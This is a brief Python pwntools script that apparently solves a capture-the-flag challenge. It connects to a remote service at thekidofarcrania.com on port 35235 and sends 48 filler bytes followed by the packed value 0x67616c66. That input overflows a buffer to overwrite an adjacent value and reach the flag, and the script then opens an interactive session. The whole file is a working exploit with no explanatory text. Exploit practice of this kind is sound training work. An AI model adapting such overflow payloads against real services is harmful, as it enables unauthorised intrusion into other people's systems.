from pwn import *

r = remote("thekidofarcrania.com", 35235)

payload = b"a"*48 + p64(0x67616c66)
r.sendlineafter(b"some text:", payload)

r.interactive()